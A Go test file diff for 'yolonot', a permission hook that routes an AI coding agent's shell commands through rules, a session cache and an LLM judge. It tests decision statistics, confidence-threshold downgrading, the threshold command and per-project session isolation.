+	if !strings.Contains(out, "Asked:") || !strings.Contains(out, "3 (30%)") {
+		t.Errorf("expected 3 asked (30%%), got: %s", out)
+	}
+	if !strings.Contains(out, "Denied:") || !strings.Contains(out, "1 (10%)") {
+		t.Errorf("expected 1 denied (10%%), got: %s", out)
+	}
+	if !strings.Contains(out, "Passthrough:") || !strings.Contains(out, "1 (LLM unavailable)") {
+		t.Errorf("expected 1 passthrough, got: %s", out)
+	}
+}
+
+func TestStats_LayerDistribution(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	entries := []DecisionEntry{
+		{Timestamp: "2026-04-01T10:00:00Z", Command: "ls", Decision: "allow", Layer: "rule", Project: "p"},
+		{Timestamp: "2026-04-01T10:01:00Z", Command: "cat", Decision: "allow", Layer: "rule", Project: "p"},
+		{Timestamp: "2026-04-01T10:02:00Z", Command: "git status", Decision: "allow", Layer: "session", Project: "p"},
+		{Timestamp: "2026-04-01T10:03:00Z", Command: "echo", Decision: "allow", Layer: "cache", Project: "p"},
+		{Timestamp: "2026-04-01T10:04:00Z", Command: "go test", Decision: "allow", Layer: "llm", Project: "p"},
+	}
+	writeTestDecisions(t, entries)
+
+	out := captureStdout(func() {
+		cmdStats()
+	})
+	if !strings.Contains(out, "By layer:") {
+		t.Errorf("expected 'By layer:' section, got: %s", out)
+	}
+	if !strings.Contains(out, "rule") {
+		t.Errorf("expected 'rule' layer, got: %s", out)
+	}
+	if !strings.Contains(out, "session") {
+		t.Errorf("expected 'session' layer, got: %s", out)
+	}
+	if !strings.Contains(out, "cache") {
+		t.Errorf("expected 'cache' layer, got: %s", out)
+	}
+	if !strings.Contains(out, "llm") {
+		t.Errorf("expected 'llm' layer, got: %s", out)
+	}
+}
+
+func TestStats_TopAsked(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	entries := []DecisionEntry{
+		{Timestamp: "2026-04-01T10:00:00Z", Command: "docker compose down", Decision: "ask", Layer: "llm", Project: "p"},
+		{Timestamp: "2026-04-01T10:01:00Z", Command: "docker compose down -v", Decision: "ask", Layer: "llm", Project: "p"},
+		{Timestamp: "2026-04-01T10:02:00Z", Command: "docker compose down --remove-orphans", Decision: "ask", Layer: "llm", Project: "p"},
+		{Timestamp: "2026-04-01T10:03:00Z", Command: "docker compose up -d", Decision: "ask", Layer: "llm", Project: "p"},
+		{Timestamp: "2026-04-01T10:04:00Z", Command: "docker compose restart", Decision: "ask", Layer: "llm", Project: "p"},
+		{Timestamp: "2026-04-01T10:05:00Z", Command: "kubectl delete job myjob", Decision: "ask", Layer: "llm", Project: "p"},
+		{Timestamp: "2026-04-01T10:06:00Z", Command: "kubectl delete job other", Decision: "ask", Layer: "llm", Project: "p"},
+		{Timestamp: "2026-04-01T10:07:00Z", Command: "kubectl delete pod x", Decision: "ask", Layer: "llm", Project: "p"},
+	}
+	writeTestDecisions(t, entries)
+
+	out := captureStdout(func() {
+		cmdStats()
+	})
+	if !strings.Contains(out, "Top asked") {
+		t.Errorf("expected 'Top asked' section, got: %s", out)
+	}
+	// "docker compose down" appears 3x, "docker compose up" 1x, "docker compose restart" 1x
+	// All normalize to "docker compose down", "docker compose up", "docker compose restart"
+	// "kubectl delete job" appears 2x, "kubectl delete pod" 1x
+	dockerIdx := strings.Index(out, "docker compose down")
+	kubectlIdx := strings.Index(out, "kubectl delete job")
+	if dockerIdx < 0 {
+		t.Errorf("expected 'docker compose down' in top asked, got: %s", out)
+	}
+	if kubectlIdx < 0 {
+		t.Errorf("expected 'kubectl delete job' in top asked, got: %s", out)
+	}
+	if dockerIdx >= 0 && kubectlIdx >= 0 && dockerIdx > kubectlIdx {
+		t.Errorf("docker compose down (3x) should appear before kubectl delete job (2x)")
+	}
+}
+
+func TestStats_LLMLatency(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	entries := []DecisionEntry{
+		{Timestamp: "2026-04-01T10:00:00Z", Command: "ls", Decision: "allow", Layer: "llm", DurationMs: 200, Project: "p"},
+		{Timestamp: "2026-04-01T10:01:00Z", Command: "cat", Decision: "allow", Layer: "llm", DurationMs: 300, Project: "p"},
+		{Timestamp: "2026-04-01T10:02:00Z", Command: "echo", Decision: "allow", Layer: "llm", DurationMs: 400, Project: "p"},
+		{Timestamp: "2026-04-01T10:03:00Z", Command: "pwd", Decision: "allow", Layer: "rule", Project: "p"},
+	}
+	writeTestDecisions(t, entries)
+
+	out := captureStdout(func() {
+		cmdStats()
+	})
+	// avg = (200+300+400)/3 = 300
+	if !strings.Contains(out, "LLM calls:") {
+		t.Errorf("expected 'LLM calls:' section, got: %s", out)
+	}
+	if !strings.Contains(out, "3 (avg 300ms)") {
+		t.Errorf("expected avg 300ms for 3 LLM calls, got: %s", out)
+	}
+}
+
+func TestStats_ProjectBreakdown(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	entries := []DecisionEntry{
+		{Timestamp: "2026-04-01T10:00:00Z", Command: "ls", Decision: "allow", Layer: "rule", Project: "yolonot"},
+		{Timestamp: "2026-04-01T10:01:00Z", Command: "cat", Decision: "allow", Layer: "rule", Project: "yolonot"},
+		{Timestamp: "2026-04-01T10:02:00Z", Command: "test", Decision: "ask", Layer: "llm", Project: "yolonot"},
+		{Timestamp: "2026-04-01T10:03:00Z", Command: "build", Decision: "allow", Layer: "rule", Project: "code-rag"},
+		{Timestamp: "2026-04-01T10:04:00Z", Command: "deploy", Decision: "deny", Layer: "rule", Project: "code-rag"},
+	}
+	writeTestDecisions(t, entries)
+
+	out := captureStdout(func() {
+		cmdStats()
+	})
+	if !strings.Contains(out, "By project:") {
+		t.Errorf("expected 'By project:' section, got: %s", out)
+	}
+	if !strings.Contains(out, "yolonot") {
+		t.Errorf("expected 'yolonot' project, got: %s", out)
+	}
+	if !strings.Contains(out, "code-rag") {
+		t.Errorf("expected 'code-rag' project, got: %s", out)
+	}
+	// yolonot has 3 entries, code-rag has 2, so yolonot should come first
+	yoloIdx := strings.Index(out, "yolonot")
+	codeIdx := strings.Index(out, "code-rag")
+	if yoloIdx > codeIdx {
+		t.Errorf("yolonot (3) should appear before code-rag (2) in project breakdown")
+	}
+}
+
+func TestStats_SingleEntry(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	entries := []DecisionEntry{
+		{Timestamp: "2026-04-13T12:00:00Z", Command: "echo hello", Decision: "allow", Layer: "rule", Project: "test"},
+	}
+	writeTestDecisions(t, entries)
+
+	out := captureStdout(func() {
+		cmdStats()
+	})
+	if !strings.Contains(out, "Total decisions:   1") {
+		t.Errorf("expected total 1, got: %s", out)
+	}
+	if !strings.Contains(out, "yolonot stats") {
+		t.Errorf("expected 'yolonot stats' header, got: %s", out)
+	}
+	// Should show the date
+	if !strings.Contains(out, "2026-04-13") {
+		t.Errorf("expected date 2026-04-13 in output, got: %s", out)
+	}
+}
+
+// --- Confidence Threshold Tests ---
+
+func TestConfidenceThreshold_DisabledByDefault(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	cfg := LoadConfig()
+	if cfg.ConfidenceThreshold != 0 {
+		t.Errorf("default ConfidenceThreshold should be 0, got %f", cfg.ConfidenceThreshold)
+	}
+}
+
+func TestConfidenceThreshold_AllowPassesAboveThreshold(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// Mock LLM returns allow with confidence 0.95
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"allow","confidence":0.95,"reasoning":"safe command"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	// Configure with threshold 0.9
+	SaveConfig(Config{
+		Provider:            ProviderConfig{URL: server.URL, Model: "test"},
+		ConfidenceThreshold: 0.9,
+	})
+
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"threshold-above","cwd":"%s","tool_input":{"command":"go test ./..."}}`, projectDir)
+	out := runHookWithPayload(t, payload)
+
+	if !strings.Contains(out, `"permissionDecision":"allow"`) {
+		t.Errorf("confidence 0.95 >= threshold 0.9 should allow, got: %s", out)
+	}
+}
+
+func TestConfidenceThreshold_DowngradeBelowThreshold(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// Mock LLM returns allow with confidence 0.7
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"allow","confidence":0.7,"reasoning":"probably safe"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	// Configure with threshold 0.9
+	SaveConfig(Config{
+		Provider:            ProviderConfig{URL: server.URL, Model: "test"},
+		ConfidenceThreshold: 0.9,
+	})
+
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"threshold-below","cwd":"%s","tool_input":{"command":"go test ./..."}}`, projectDir)
+	out := runHookWithPayload(t, payload)
+
+	if !strings.Contains(out, `"permissionDecision":"ask"`) {
+		t.Errorf("confidence 0.7 < threshold 0.9 should ask, got: %s", out)
+	}
+	if !strings.Contains(out, "below threshold") {
+		t.Errorf("should mention below threshold, got: %s", out)
+	}
+	// Should be in asked, not approved (under project-scoped session ID)
+	projSID := ProjectSessionID("threshold-below", projectDir)
+	if ContainsLine(projSID, "approved", "go test ./...") {
+		t.Error("below-threshold command should NOT be in approved")
+	}
+	if !ContainsLine(projSID, "asked", "go test ./...") {
+		t.Error("below-threshold command should be in asked")
+	}
+}
+
+func TestConfidenceThreshold_ZeroDisablesCheck(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// Mock LLM returns allow with low confidence 0.3
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"allow","confidence":0.3,"reasoning":"might be safe"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	// Configure with threshold 0 (disabled)
+	SaveConfig(Config{
+		Provider:            ProviderConfig{URL: server.URL, Model: "test"},
+		ConfidenceThreshold: 0,
+	})
+
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"threshold-zero","cwd":"%s","tool_input":{"command":"go test ./..."}}`, projectDir)
+	out := runHookWithPayload(t, payload)
+
+	if !strings.Contains(out, `"permissionDecision":"allow"`) {
+		t.Errorf("threshold 0 (disabled) should allow even at confidence 0.3, got: %s", out)
+	}
+}
+
+func TestConfidenceThreshold_AskDecisionUnaffected(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// Mock LLM returns ask
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"ask","confidence":0.95,"reasoning":"DANGEROUS: mutation"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	// Configure with threshold 0.9
+	SaveConfig(Config{
+		Provider:            ProviderConfig{URL: server.URL, Model: "test"},
+		ConfidenceThreshold: 0.9,
+	})
+
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	payload := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"threshold-ask","cwd":"%s","tool_input":{"command":"kubectl delete pod"}}`, projectDir)
+	out := runHookWithPayload(t, payload)
+
+	if !strings.Contains(out, `"permissionDecision":"ask"`) {
+		t.Errorf("ask decision should be unaffected by threshold, got: %s", out)
+	}
+	// Should NOT mention "below threshold" — it's an ask decision, not a downgraded allow
+	if strings.Contains(out, "below threshold") {
+		t.Errorf("ask decision should not mention below threshold, got: %s", out)
+	}
+}
+
+func TestConfidenceThreshold_CacheAllowDowngraded(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// Mock LLM returns allow with confidence 0.7 — stays constant across calls
+	var llmCallCount int
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		llmCallCount++
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"choices": []map[string]interface{}{
+				{"message": map[string]string{"content": `{"decision":"allow","confidence":0.7,"reasoning":"probably safe"}`}},
+			},
+		})
+	}))
+	defer server.Close()
+
+	// Configure with threshold 0.9
+	SaveConfig(Config{
+		Provider:            ProviderConfig{URL: server.URL, Model: "test"},
+		ConfidenceThreshold: 0.9,
+	})
+
+	// Create a script file so checkCache / saveCache actually engage (they only
+	// cache when the command references a script path).
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	scriptPath := filepath.Join(projectDir, "deploy.sh")
+	os.WriteFile(scriptPath, []byte("#!/bin/sh\necho deploying\n"), 0644)
+
+	origCwd, _ := os.Getwd()
+	os.Chdir(projectDir)
+	defer os.Chdir(origCwd)
+
+	command := "sh " + scriptPath
+
+	// Use two DIFFERENT session IDs so Step 1.5 (session_deny for asked-but-not-approved)
+	// doesn't short-circuit the second call — we want to exercise the cache path.
+	payload1 := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"cache-threshold-1","cwd":"%s","tool_input":{"command":%q}}`, projectDir, command)
+	payload2 := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"cache-threshold-2","cwd":"%s","tool_input":{"command":%q}}`, projectDir, command)
+
+	// First call: LLM evaluates, caches the raw allow@0.7, but threshold downgrades to ask
+	out1 := runHookWithPayload(t, payload1)
+	if !strings.Contains(out1, `"permissionDecision":"ask"`) {
+		t.Errorf("first call: allow 0.7 < threshold 0.9 should ask, got: %s", out1)
+	}
+	if !strings.Contains(out1, "below threshold") {
+		t.Errorf("first call: should mention below threshold, got: %s", out1)
+	}
+	if llmCallCount != 1 {
+		t.Errorf("first call: expected 1 LLM call, got %d", llmCallCount)
+	}
+
+	// Verify cache stored the RAW LLM decision (allow@0.7), not the downgraded ask
+	cached := checkCache(command)
+	if cached == nil {
+		t.Fatal("expected cache entry after first call")
+	}
+	if cached.Decision != "allow" {
+		t.Errorf("cache should store raw LLM decision (allow), got: %s", cached.Decision)
+	}
+	if cached.Confidence != 0.7 {
+		t.Errorf("cache should store raw confidence 0.7, got: %f", cached.Confidence)
+	}
+
+	// Second call (fresh session): should hit cache, threshold should downgrade cached allow to ask
+	out2 := runHookWithPayload(t, payload2)
+	if !strings.Contains(out2, `"permissionDecision":"ask"`) {
+		t.Errorf("second call: cached allow 0.7 < threshold 0.9 should downgrade to ask, got: %s", out2)
+	}
+	if !strings.Contains(out2, "below threshold") {
+		t.Errorf("second call: should mention below threshold, got: %s", out2)
+	}
+	if llmCallCount != 1 {
+		t.Errorf("second call: cache hit should NOT call LLM; got %d total LLM calls", llmCallCount)
+	}
+
+	// Second session's command should be in asked, not approved
+	projSID2 := ProjectSessionID("cache-threshold-2", projectDir)
+	if ContainsLine(projSID2, "approved", command) {
+		t.Error("downgraded cache hit should NOT add command to approved")
+	}
+	if !ContainsLine(projSID2, "asked", command) {
+		t.Error("downgraded cache hit should add command to asked")
+	}
+}
+
+// --- Threshold Command ---
+
+func TestThresholdCommand_ShowCurrent(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	SaveConfig(Config{ConfidenceThreshold: 0.85})
+
+	out := captureStdout(func() { cmdThreshold(nil) })
+	if !strings.Contains(out, "85%") {
+		t.Errorf("should show 85%%, got: %s", out)
+	}
+	if !strings.Contains(out, "below this confidence") {
+		t.Errorf("should explain what threshold does, got: %s", out)
+	}
+}
+
+func TestThresholdCommand_ShowDisabled(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	SaveConfig(Config{ConfidenceThreshold: 0})
+
+	out := captureStdout(func() { cmdThreshold(nil) })
+	if !strings.Contains(out, "disabled") {
+		t.Errorf("should show disabled, got: %s", out)
+	}
+}
+
+func TestThresholdCommand_SetValue(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	captureStdout(func() { cmdThreshold([]string{"90"}) })
+
+	cfg := LoadConfig()
+	if cfg.ConfidenceThreshold != 0.9 {
+		t.Errorf("config threshold should be 0.9, got %f", cfg.ConfidenceThreshold)
+	}
+}
+
+func TestThresholdCommand_SetZero(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	// First set a value
+	SaveConfig(Config{ConfidenceThreshold: 0.9})
+
+	out := captureStdout(func() { cmdThreshold([]string{"0"}) })
+
+	cfg := LoadConfig()
+	if cfg.ConfidenceThreshold != 0 {
+		t.Errorf("config threshold should be 0, got %f", cfg.ConfidenceThreshold)
+	}
+	if !strings.Contains(out, "disabled") {
+		t.Errorf("should say disabled, got: %s", out)
+	}
+}
+
+func TestThresholdCommand_InvalidInput(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	SaveConfig(Config{ConfidenceThreshold: 0.85})
+
+	errOut := captureStderr(func() { cmdThreshold([]string{"abc"}) })
+
+	if !strings.Contains(errOut, "Invalid") {
+		t.Errorf("stderr should contain 'Invalid', got: %s", errOut)
+	}
+
+	cfg := LoadConfig()
+	if cfg.ConfidenceThreshold != 0.85 {
+		t.Errorf("config threshold should remain 0.85 after invalid input, got %f", cfg.ConfidenceThreshold)
+	}
+}
+
+func TestThresholdCommand_OutOfRange_High(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	SaveConfig(Config{ConfidenceThreshold: 0.85})
+
+	errOut := captureStderr(func() { cmdThreshold([]string{"150"}) })
+
+	if !strings.Contains(errOut, "between 0 and 100") {
+		t.Errorf("stderr should show range error, got: %s", errOut)
+	}
+
+	cfg := LoadConfig()
+	if cfg.ConfidenceThreshold != 0.85 {
+		t.Errorf("config threshold should remain 0.85 after out-of-range input, got %f", cfg.ConfidenceThreshold)
+	}
+}
+
+func TestThresholdCommand_OutOfRange_Negative(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	SaveConfig(Config{ConfidenceThreshold: 0.85})
+
+	errOut := captureStderr(func() { cmdThreshold([]string{"-5"}) })
+
+	if !strings.Contains(errOut, "between 0 and 100") {
+		t.Errorf("stderr should show range error, got: %s", errOut)
+	}
+
+	cfg := LoadConfig()
+	if cfg.ConfidenceThreshold != 0.85 {
+		t.Errorf("config threshold should remain 0.85 after negative input, got %f", cfg.ConfidenceThreshold)
+	}
+}
+
+// --- Project Session ID ---
+
+func TestProjectSessionID_WithGitRoot(t *testing.T) {
+	dir := t.TempDir()
+	exec.Command("git", "-C", dir, "init").Run()
+
+	result := ProjectSessionID("my-session", dir)
+	if result == "my-session" {
+		t.Error("should include hash suffix for git repo")
+	}
+	if !strings.HasPrefix(result, "my-session_") {
+		t.Errorf("should start with session ID, got %q", result)
+	}
+	// Hash suffix should be 8 hex chars
+	parts := strings.SplitN(result, "_", 2)
+	if len(parts) != 2 || len(parts[1]) != 8 {
+		t.Errorf("hash suffix should be 8 hex chars, got %q", result)
+	}
+}
+
+func TestProjectSessionID_WithoutGit(t *testing.T) {
+	dir := t.TempDir()
+
+	result := ProjectSessionID("my-session", dir)
+	if result == "my-session" {
+		t.Error("should include hash suffix even without git")
+	}
+	if !strings.HasPrefix(result, "my-session_") {
+		t.Errorf("should start with session ID, got %q", result)
+	}
+	// Should use cwd-based hash
+	parts := strings.SplitN(result, "_", 2)
+	if len(parts) != 2 || len(parts[1]) != 8 {
+		t.Errorf("hash suffix should be 8 hex chars, got %q", result)
+	}
+}
+
+func TestProjectSessionID_EmptyCwd(t *testing.T) {
+	result := ProjectSessionID("my-session", "")
+	if result != "my-session" {
+		t.Errorf("empty cwd should return plain sessionID, got %q", result)
+	}
+}
+
+func TestProjectSessionID_EmptySessionID(t *testing.T) {
+	result := ProjectSessionID("", "/some/dir")
+	if result != "" {
+		t.Errorf("empty sessionID should return empty, got %q", result)
+	}
+}
+
+func TestProjectSessionID_DifferentProjects(t *testing.T) {
+	dirA := t.TempDir()
+	dirB := t.TempDir()
+
+	resultA := ProjectSessionID("session-1", dirA)
+	resultB := ProjectSessionID("session-1", dirB)
+
+	if resultA == resultB {
+		t.Errorf("different directories should produce different keys: %q vs %q", resultA, resultB)
+	}
+}
+
+func TestProjectSessionID_SameProject(t *testing.T) {
+	dir := t.TempDir()
+
+	result1 := ProjectSessionID("session-1", dir)
+	result2 := ProjectSessionID("session-1", dir)
+
+	if result1 != result2 {
+		t.Errorf("same directory should produce same key: %q vs %q", result1, result2)
+	}
+}
+
+func TestHook_ProjectIsolation(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	sid := "isolation-test"
+	dirA := t.TempDir()
+	dirB := t.TempDir()
+	command := "echo hello"
+
+	// PostToolUse in project A: saves to approved under project A's hash
+	payloadPost := fmt.Sprintf(`{"hook_event_name":"PostToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"%s"}}`, sid, dirA, command)
+	runHookWithPayload(t, payloadPost)
+
+	// Verify it was saved under project A's session key
+	projSIDA := ProjectSessionID(sid, dirA)
+	if !ContainsLine(projSIDA, "approved", command) {
+		t.Fatal("command should be approved in project A")
+	}
+
+	// Verify it is NOT in project B's session key
+	projSIDB := ProjectSessionID(sid, dirB)
+	if ContainsLine(projSIDB, "approved", command) {
+		t.Error("command should NOT be approved in project B")
+	}
+
+	// PreToolUse in project B: same command, different cwd → should NOT session-match
+	payloadPre := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"%s"}}`, sid, dirB, command)
+	out := runHookWithPayload(t, payloadPre)
+
+	// Should NOT get "previously approved this session" — the command was only approved in project A
+	if strings.Contains(out, "previously approved") {
+		t.Errorf("command approved in project A should NOT auto-approve in project B, got: %s", out)
+	}
+}
+
+func TestHook_SameProjectSessionMatch(t *testing.T) {
+	_, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	sid := "same-project-test"
+	dir := t.TempDir()
+	command := "echo hello"
+
+	// PostToolUse: save to approved
+	payloadPost := fmt.Sprintf(`{"hook_event_name":"PostToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"%s"}}`, sid, dir, command)
+	runHookWithPayload(t, payloadPost)
+
+	// PreToolUse with same cwd: should session-match
+	payloadPre := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"%s"}}`, sid, dir, command)
+	out := runHookWithPayload(t, payloadPre)
+
+	if !strings.Contains(out, "previously approved") {
+		t.Errorf("same project should session-match, got: %s", out)
+	}
+	if !strings.Contains(out, `"permissionDecision":"allow"`) {
+		t.Errorf("should allow previously approved command in same project, got: %s", out)
+	}
+}
+
+func TestHook_PauseIsSessionWide(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	sid := "pause-wide-test"
+
+	// Create .paused file for the base session ID (not project-scoped)
+	os.MkdirAll(filepath.Join(dir, ".yolonot", "sessions"), 0755)
+	os.WriteFile(filepath.Join(dir, ".yolonot", "sessions", sid+".paused"), []byte{}, 0644)
+
+	dirA := t.TempDir()
+	dirB := t.TempDir()
+
+	// PreToolUse from project A — should be bypassed (paused)
+	payloadA := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"dangerous cmd"}}`, sid, dirA)
+	outA := strings.TrimSpace(runHookWithPayload(t, payloadA))
+	if outA != "" {
+		t.Errorf("paused session should bypass regardless of project A, got: %s", outA)
+	}
+
+	// PreToolUse from project B — should also be bypassed (paused)
+	payloadB := fmt.Sprintf(`{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":"dangerous cmd"}}`, sid, dirB)
+	outB := strings.TrimSpace(runHookWithPayload(t, payloadB))
+	if outB != "" {
+		t.Errorf("paused session should bypass regardless of project B, got: %s", outB)
+	}
+}
+
+// --- baseSessionID / FindSessionID with hashed names ---
+
+func TestBaseSessionID(t *testing.T) {
+	tests := []struct {
+		stem string
+		want string
+	}{
+		{"abc-123_deadbeef", "abc-123"},
+		{"simple-session", "simple-session"},
+		{"session_12345678", "session"},
+		{"session_nothex!!", "session_nothex!!"},
+		{"a_b_abcdef01", "a_b"},
+		{"", ""},
+	}
+	for _, tt := range tests {
+		got := baseSessionID(tt.stem)
+		if got != tt.want {
+			t.Errorf("baseSessionID(%q) = %q, want %q", tt.stem, got, tt.want)
+		}
+	}
+}
+
+func TestFindSessionIDWithHashedFiles(t *testing.T) {
+	dir := t.TempDir()
+	os.Setenv("HOME", dir)
+	defer os.Setenv("HOME", "")
+	sessDir := filepath.Join(dir, ".yolonot", "sessions")
+	os.MkdirAll(sessDir, 0755)
+
+	// Create a project-scoped session file
+	os.WriteFile(filepath.Join(sessDir, "my-session_abcd1234.approved"), []byte("cmd1\n"), 0644)
+
+	got := FindSessionID()
+	if got != "my-session" {
+		t.Errorf("FindSessionID should strip hash, got %q, want %q", got, "my-session")
 	}
 }
